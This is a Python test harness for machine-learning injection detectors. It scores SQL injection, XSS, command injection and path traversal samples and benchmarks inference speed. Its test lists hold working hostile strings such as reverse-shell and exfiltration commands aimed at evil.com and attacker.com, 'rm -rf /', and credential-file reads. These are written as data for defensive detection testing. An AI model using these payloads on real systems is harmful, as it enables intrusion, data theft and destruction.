#!/usr/bin/env python3
"""
ML Model Test Script for Injection Detection
Tests only the neural network models (GBST + Transformer)
Bypasses rule-based filtering to test pure ML performance
"""

import torch
import torch.nn as nn
import numpy as np
import time
import json
from typing import Dict, List, Tuple, Optional
from datetime import datetime
import os
import sys

# Import the ML models
try:
    from models import InjectionDetectionModel, MultiClassInjectionModel
    MODELS_AVAILABLE = True
except ImportError:
    print("❌ Error: models.py not found. Make sure models.py is in the same directory.")
    MODELS_AVAILABLE = False
    sys.exit(1)

class MLInjectionTester:
    """Pure ML injection detection tester - no rule-based filtering"""

    def __init__(self, 
                 binary_model_path: str = 'models/best_binary_injection_model.pth',
                 multiclass_model_path: str = 'models/best_multiclass_model.pth',
                 device: str = None,
                 max_length: int = 2048):

        self.device = device if device else ('cuda' if torch.cuda.is_available() else 'cpu')
        self.max_length = max_length
        self.attack_types = ['sqli', 'commandi', 'xss', 'traversal']

        print(f"🤖 Initializing ML models on device: {self.device}")

        # Load binary model
        try:
            print(f"📥 Loading binary model from: {binary_model_path}")
            self.binary_model = InjectionDetectionModel(max_length=max_length)

            if os.path.exists(binary_model_path):
                state_dict = torch.load(binary_model_path, map_location=self.device)
                self.binary_model.load_state_dict(state_dict)
                print("✅ Binary model loaded successfully")
            else:
                print(f"⚠️  Model file not found: {binary_model_path}")
                print("🔧 Using randomly initialized model for testing")

            self.binary_model.to(self.device)
            self.binary_model.eval()

        except Exception as e:
            print(f"❌ Failed to load binary model: {e}")
            raise

        # Load multiclass model
        try:
            print(f"📥 Loading multiclass model from: {multiclass_model_path}")
            base_model = InjectionDetectionModel(max_length=max_length)
            self.multiclass_model = MultiClassInjectionModel(base_model, num_classes=4)

            if os.path.exists(multiclass_model_path):
                state_dict = torch.load(multiclass_model_path, map_location=self.device)
                self.multiclass_model.load_state_dict(state_dict)
                print("✅ Multiclass model loaded successfully")
            else:
                print(f"⚠️  Model file not found: {multiclass_model_path}")
                print("🔧 Using randomly initialized model for testing")

            self.multiclass_model.to(self.device)
            self.multiclass_model.eval()

        except Exception as e:
            print(f"❌ Failed to load multiclass model: {e}")
            raise

        print("🚀 ML models ready for testing!")

    def preprocess_text(self, text: str) -> Dict[str, torch.Tensor]:
        """Convert text to model input format (byte-level tokenization)"""

        if not text:
            text = ""

        # Convert to bytes (GBST tokenization approach)
        try:
            byte_sequence = list(text.encode('utf-8'))
        except UnicodeEncodeError:
            byte_sequence = list(text.encode('utf-8', errors='ignore'))

        # Truncate if too long
        if len(byte_sequence) > self.max_length:
            byte_sequence = byte_sequence[:self.max_length]

        # Create attention mask
        attention_mask = [False] * len(byte_sequence)

        # Pad to max length
        while len(byte_sequence) < self.max_length:
            byte_sequence.append(0)  # Padding token
            attention_mask.append(True)  # Mask padding tokens

        return {
            'input_ids': torch.tensor([byte_sequence], dtype=torch.long).to(self.device),
            'attention_mask': torch.tensor([attention_mask], dtype=torch.bool).to(self.device)
        }

    def predict_binary(self, text: str, threshold: float = 0.5) -> Dict:
        """Binary classification: malicious vs benign"""

        inputs = self.preprocess_text(text)

        with torch.no_grad():
            start_time = time.time()
            outputs = self.binary_model(inputs['input_ids'], inputs['attention_mask'])
            inference_time = (time.time() - start_time) * 1000

            probability = outputs['probabilities'].item()
            logit = outputs['logits'].item()
            is_malicious = probability > threshold

            return {
                'is_malicious': is_malicious,
                'probability': probability,
                'logit': logit,
                'confidence': probability if is_malicious else (1 - probability),
                'inference_time_ms': inference_time
            }

    def predict_multiclass(self, text: str) -> Dict:
        """Multi-class attack type classification"""

        inputs = self.preprocess_text(text)

        with torch.no_grad():
            start_time = time.time()
            outputs = self.multiclass_model(inputs['input_ids'], inputs['attention_mask'])
            inference_time = (time.time() - start_time) * 1000

            probabilities = outputs['probabilities'][0].cpu().numpy()
            predicted_class = probabilities.argmax()
            attack_type = self.attack_types[predicted_class]
            confidence = float(probabilities[predicted_class])

            # Create probability distribution
            class_probs = {
                self.attack_types[i]: float(probabilities[i]) 
                for i in range(len(self.attack_types))
            }

            return {
                'predicted_attack_type': attack_type,
                'confidence': confidence,
                'class_probabilities': class_probs,
                'inference_time_ms': inference_time
            }

    def predict_combined(self, text: str, binary_threshold: float = 0.5) -> Dict:
        """Combined prediction: binary + multiclass"""

        # Binary prediction
        binary_result = self.predict_binary(text, binary_threshold)

        # If predicted as malicious, get attack type
        if binary_result['is_malicious']:
            multiclass_result = self.predict_multiclass(text)

            return {
                'is_malicious': True,
                'binary_confidence': binary_result['confidence'],
                'binary_probability': binary_result['probability'],
                'attack_type': multiclass_result['predicted_attack_type'],
                'attack_confidence': multiclass_result['confidence'],
                'class_probabilities': multiclass_result['class_probabilities'],
                'total_inference_time_ms': binary_result['inference_time_ms'] + multiclass_result['inference_time_ms']
            }
        else:
            return {
                'is_malicious': False,
                'binary_confidence': binary_result['confidence'],
                'binary_probability': binary_result['probability'],
                'attack_type': None,
                'attack_confidence': None,
                'class_probabilities': None,
                'total_inference_time_ms': binary_result['inference_time_ms']
            }

    def get_comprehensive_test_cases(self) -> Dict[str, List[Tuple[str, bool, str]]]:
        """Get test cases specifically designed for ML model evaluation"""

        return {
            "benign_inputs": [
                ("hello world", False, "none"),
                ("user@example.com", False, "none"),
                ("search for products", False, "none"),
                ("normal user input text", False, "none"),
                ("product catalog page", False, "none"),
                ("user profile information", False, "none"),
                ("contact form submission", False, "none"),
                ("newsletter subscription", False, "none"),
                ("password reset request", False, "none"),
                ("shopping cart checkout", False, "none"),
            ],

            "sql_injection": [
                ("'; DROP TABLE users; --", True, "sqli"),
                ("1' OR '1'='1", True, "sqli"),
                ("admin'--", True, "sqli"),
                ("' UNION SELECT * FROM passwords--", True, "sqli"),
                ("1; DELETE FROM accounts; --", True, "sqli"),
                ("' OR 1=1#", True, "sqli"),
                ("'; INSERT INTO users VALUES('hacker','pass');--", True, "sqli"),
                ("1' AND (SELECT COUNT(*) FROM users)>0--", True, "sqli"),
                ("' OR 'x'='x", True, "sqli"),
                ("admin'; DROP DATABASE production; --", True, "sqli"),
                ("1' UNION SELECT password FROM admin--", True, "sqli"),
                ("'; EXEC xp_cmdshell('dir'); --", True, "sqli"),
                ("' AND 1=1 UNION SELECT null,username,password FROM users--", True, "sqli"),
                ("1' OR SLEEP(5)--", True, "sqli"),
                ("'; WAITFOR DELAY '00:00:05'--", True, "sqli"),
            ],

            "xss_attacks": [
                ("<script>alert('XSS')</script>", True, "xss"),
                ("<img src=x onerror=alert(1)>", True, "xss"),
                ("javascript:alert('XSS')", True, "xss"),
                ("<svg onload=alert('XSS')>", True, "xss"),
                ("<iframe src=javascript:alert('XSS')></iframe>", True, "xss"),
                ("<body onload=alert('XSS')>", True, "xss"),
                ("<input type=text onclick=alert('XSS')>", True, "xss"),
                ("'><script>alert('XSS')</script>", True, "xss"),
                ("<script src=http://evil.com/xss.js></script>", True, "xss"),
                ("</script><script>alert('XSS')</script>", True, "xss"),
                ("<img src='' onerror=alert(String.fromCharCode(88,83,83))>", True, "xss"),
                ("<svg><script>alert('XSS')</script></svg>", True, "xss"),
                ("<object data='data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='></object>", True, "xss"),
                ("<embed src='data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='></embed>", True, "xss"),
            ],

            "command_injection": [
                ("; ls -la", True, "commandi"),
                ("| whoami", True, "commandi"),
                ("& echo 'pwned'", True, "commandi"),
                ("`cat /etc/passwd`", True, "commandi"),
                ("$(rm -rf /)", True, "commandi"),
                ("; wget http://evil.com/shell.php", True, "commandi"),
                ("|| cat /etc/shadow", True, "commandi"),
                ("; nc -l -p 4444 -e /bin/bash", True, "commandi"),
                ("& curl http://attacker.com/exfil", True, "commandi"),
                ("`python -c 'import os; os.system(\"rm -rf /\")'`", True, "commandi"),
                ("; python -c \"import socket,subprocess,os;s=socket.socket()\"", True, "commandi"),
                ("| base64 /etc/passwd", True, "commandi"),
                ("& powershell -c \"Get-Process\"", True, "commandi"),
                ("`php -r 'system(\"id\");'`", True, "commandi"),
            ],

            "path_traversal": [
                ("../../../etc/passwd", True, "traversal"),
                ("..\\..\\..\\windows\\system32\\config\\sam", True, "traversal"),
                ("/etc/passwd", True, "traversal"),
                ("....//....//....//etc//passwd", True, "traversal"),
                ("..%2f..%2f..%2fetc%2fpasswd", True, "traversal"),
                ("..\\..\\..\\etc\\passwd", True, "traversal"),
                ("%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", True, "traversal"),
                ("....\\....\\....\\windows\\system32", True, "traversal"),
                ("file:///etc/passwd", True, "traversal"),
                ("../../../../../proc/self/environ", True, "traversal"),
                ("\\..\\..\\..\\etc\\passwd", True, "traversal"),
                ("..%5c..%5c..%5cwindows%5csystem32", True, "traversal"),
            ],

            "mixed_attacks": [
                ("'; DROP TABLE users; -- <script>alert('xss')</script>", True, "sqli"),  # SQL + XSS
                ("admin'; EXEC xp_cmdshell('whoami'); --", True, "sqli"),  # SQL + Command
                ("<img src='../../../etc/passwd' onerror='alert(1)'>", True, "xss"),  # XSS + Traversal
                ("file=../../../etc/passwd&cmd=cat", True, "traversal"),  # Traversal + Command hint
            ],

            "encoded_attacks": [
                ("%27%20OR%20%271%27%3D%271", True, "sqli"),  # URL encoded SQL
                ("%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E", True, "xss"),  # URL encoded XSS
                ("&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;", True, "xss"),  # HTML entities
                ("\\x3cscript\\x3ealert(\\x27XSS\\x27)\\x3c/script\\x3e", True, "xss"),  # Hex encoded
            ],

            "edge_cases": [
                ("", False, "none"),  # Empty
                ("   ", False, "none"),  # Whitespace
                ("a" * 100, False, "none"),  # Long benign
                ("'" * 50, True, "sqli"),  # Many quotes (suspicious)
                ("<" * 20 + ">" * 20, True, "xss"),  # Many brackets
                ("SELECT" + " " * 100 + "* FROM users", True, "sqli"),  # Spaced SQL
                ("\n\r\t\0", False, "none"),  # Control characters
                ("🚀💻🔒SQL injection test", True, "sqli"),  # Unicode mixed
            ]
        }

    def run_ml_tests(self, test_cases: Dict = None, binary_threshold: float = 0.5) -> Dict:
        """Run comprehensive ML model tests"""

        if test_cases is None:
            test_cases = self.get_comprehensive_test_cases()

        print("\n" + "=" * 70)
        print("🧠 PURE ML MODEL TESTING (NO RULE FILTERING)")
        print("=" * 70)
        print(f"Device: {self.device}")
        print(f"Binary Threshold: {binary_threshold}")
        print(f"Max Sequence Length: {self.max_length}")
        print()

        all_results = {}
        total_tests = 0
        total_correct = 0
        total_time = 0

        for category, cases in test_cases.items():
            print(f"📂 Testing {category.upper().replace('_', ' ')} ({len(cases)} cases)")
            print("-" * 50)

            category_results = []
            category_correct = 0

            for i, (test_input, expected_malicious, expected_type) in enumerate(cases):
                total_tests += 1

                try:
                    # Get ML prediction
                    result = self.predict_combined(test_input, binary_threshold)

                    predicted_malicious = result['is_malicious']
                    total_time += result['total_inference_time_ms']

                    # Check correctness
                    correct = predicted_malicious == expected_malicious
                    if correct:
                        total_correct += 1
                        category_correct += 1
                        status = "✅"
                    else:
                        status = "❌"

                    # Format output
                    input_display = test_input[:40] + "..." if len(test_input) > 40 else test_input
                    pred_text = "MALICIOUS" if predicted_malicious else "BENIGN"
                    conf_text = f"[{result['binary_confidence']:.3f}]"

                    if predicted_malicious and result['attack_type']:
                        type_text = f"({result['attack_type']})"
                        attack_conf = f"[{result['attack_confidence']:.3f}]"
                    else:
                        type_text = ""
                        attack_conf = ""

                    time_text = f"{result['total_inference_time_ms']:.1f}ms"

                    print(f"{status} {pred_text:<10} {conf_text} {type_text:<8} {attack_conf:<8} {time_text:<8} | {input_display}")

                    # Store detailed results
                    test_result = {
                        'input': test_input,
                        'expected_malicious': expected_malicious,
                        'expected_type': expected_type,
                        'predicted_malicious': predicted_malicious,
                        'correct': correct,
                        'ml_result': result
                    }
                    category_results.append(test_result)

                except Exception as e:
                    print(f"❌ ERROR testing '{test_input[:40]}': {e}")
                    category_results.append({
                        'input': test_input,
                        'error': str(e),
                        'correct': False
                    })

            # Category summary
            category_accuracy = (category_correct / len(cases)) * 100 if cases else 0
            print(f"\n📊 {category.upper()} ACCURACY: {category_accuracy:.1f}% ({category_correct}/{len(cases)})")
            print()

            all_results[category] = {
                'results': category_results,
                'accuracy': category_accuracy,
                'correct': category_correct,
                'total': len(cases)
            }

        # Overall summary
        overall_accuracy = (total_correct / total_tests) * 100 if total_tests > 0 else 0
        avg_time = total_time / total_tests if total_tests > 0 else 0

        print("=" * 70)
        print("🎯 OVERALL ML MODEL PERFORMANCE")
        print("=" * 70)
        print(f"Total Tests: {total_tests}")
        print(f"Correct Predictions: {total_correct}")
        print(f"Overall Accuracy: {overall_accuracy:.1f}%")
        print(f"Average Inference Time: {avg_time:.2f}ms")
        print(f"Total Test Time: {total_time/1000:.2f}s")

        return {
            'category_results': all_results,
            'summary': {
                'total_tests': total_tests,
                'correct_predictions': total_correct,
                'overall_accuracy': overall_accuracy,
                'average_inference_time_ms': avg_time,
                'total_time_seconds': total_time/1000
            }
        }

    def benchmark_performance(self, num_iterations: int = 100) -> Dict:
        """Benchmark ML model performance"""

        print("\n" + "=" * 70)
        print("⚡ ML MODEL PERFORMANCE BENCHMARK")
        print("=" * 70)

        benchmark_texts = [
            "normal text",
            "'; DROP TABLE users; --",
            "<script>alert('xss')</script>",
            "../../../etc/passwd",
            "a" * 500,  # Medium length
            "b" * 1500,  # Long input
        ]

        # Binary model benchmark
        print(f"\n🎯 Binary Model Benchmark ({num_iterations} iterations per text)")
        binary_times = []

        for text in benchmark_texts:
            text_times = []
            for _ in range(num_iterations):
                start_time = time.time()
                self.predict_binary(text)
                text_times.append((time.time() - start_time) * 1000)

            avg_time = sum(text_times) / len(text_times)
            binary_times.extend(text_times)

            text_display = text[:30] + "..." if len(text) > 30 else text
            print(f"  '{text_display}': {avg_time:.2f}ms avg")

        binary_stats = {
            'avg_ms': sum(binary_times) / len(binary_times),
            'min_ms': min(binary_times),
            'max_ms': max(binary_times),
            'std_ms': np.std(binary_times)
        }

        # Multiclass model benchmark  
        print(f"\n🎯 Multiclass Model Benchmark ({num_iterations} iterations per text)")
        multiclass_times = []

        for text in benchmark_texts:
            text_times = []
            for _ in range(num_iterations):
                start_time = time.time()
                self.predict_multiclass(text)
                text_times.append((time.time() - start_time) * 1000)

            avg_time = sum(text_times) / len(text_times)
            multiclass_times.extend(text_times)

            text_display = text[:30] + "..." if len(text) > 30 else text
            print(f"  '{text_display}': {avg_time:.2f}ms avg")

        multiclass_stats = {
            'avg_ms': sum(multiclass_times) / len(multiclass_times),
            'min_ms': min(multiclass_times),
            'max_ms': max(multiclass_times),
            'std_ms': np.std(multiclass_times)
        }

        # Combined benchmark
        print(f"\n🎯 Combined Prediction Benchmark ({num_iterations//2} iterations per text)")
        combined_times = []

        for text in benchmark_texts:
            text_times = []
            for _ in range(num_iterations//2):
                start_time = time.time()
                self.predict_combined(text)
                text_times.append((time.time() - start_time) * 1000)

            avg_time = sum(text_times) / len(text_times)
            combined_times.extend(text_times)

            text_display = text[:30] + "..." if len(text) > 30 else text
            print(f"  '{text_display}': {avg_time:.2f}ms avg")

        combined_stats = {
            'avg_ms': sum(combined_times) / len(combined_times),
            'min_ms': min(combined_times),
            'max_ms': max(combined_times),
            'std_ms': np.std(combined_times)
        }

        print("\n📊 BENCHMARK SUMMARY:")
        print(f"Binary Model    : {binary_stats['avg_ms']:.2f}ms ± {binary_stats['std_ms']:.2f}ms")
        print(f"Multiclass Model: {multiclass_stats['avg_ms']:.2f}ms ± {multiclass_stats['std_ms']:.2f}ms")
        print(f"Combined Pipeline: {combined_stats['avg_ms']:.2f}ms ± {combined_stats['std_ms']:.2f}ms")

        return {
            'binary_model': binary_stats,
            'multiclass_model': multiclass_stats,
            'combined_pipeline': combined_stats
        }


def main():
    """Main function"""
    import argparse

    parser = argparse.ArgumentParser(description='Test ML injection detection models')
    parser.add_argument('--binary-model', default='models/best_binary_injection_model.pth',
                       help='Path to binary model')
    parser.add_argument('--multiclass-model', default='models/best_multiclass_model.pth', 
                       help='Path to multiclass model')
    parser.add_argument('--device', choices=['cpu', 'cuda', 'auto'], default='auto',
                       help='Device to run models on')
    parser.add_argument('--threshold', type=float, default=0.5,
                       help='Binary classification threshold')
    parser.add_argument('--benchmark', action='store_true',
                       help='Run performance benchmark')
    parser.add_argument('--iterations', type=int, default=50,
                       help='Benchmark iterations per test')
    parser.add_argument('--category', help='Test only specific category')

    args = parser.parse_args()

    # Initialize tester
    device = args.device if args.device != 'auto' else None

    try:
        tester = MLInjectionTester(
            binary_model_path=args.binary_model,
            multiclass_model_path=args.multiclass_model,
            device=device
        )
    except Exception as e:
        print(f"❌ Failed to initialize ML tester: {e}")
        return 1

    # Run tests
    try:
        test_cases = tester.get_comprehensive_test_cases()

        if args.category:
            if args.category in test_cases:
                test_cases = {args.category: test_cases[args.category]}
            else:
                print(f"❌ Category '{args.category}' not found")
                print(f"Available categories: {list(test_cases.keys())}")
                return 1

        results = tester.run_ml_tests(test_cases, args.threshold)

        # Save results
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        results_file = f'ml_test_results_{timestamp}.json'

        with open(results_file, 'w') as f:
            json.dump(results, f, indent=2, default=str)

        print(f"\n💾 Results saved to: {results_file}")

        # Run benchmark if requested
        if args.benchmark:
            benchmark_results = tester.benchmark_performance(args.iterations)

            benchmark_file = f'ml_benchmark_{timestamp}.json'
            with open(benchmark_file, 'w') as f:
                json.dump(benchmark_results, f, indent=2, default=str)

            print(f"💾 Benchmark results saved to: {benchmark_file}")

        return 0

    except Exception as e:
        print(f"❌ Test failed: {e}")
        return 1


if __name__ == "__main__":
    if not MODELS_AVAILABLE:
        print("❌ Cannot run tests without models.py")
        sys.exit(1)

    sys.exit(main())
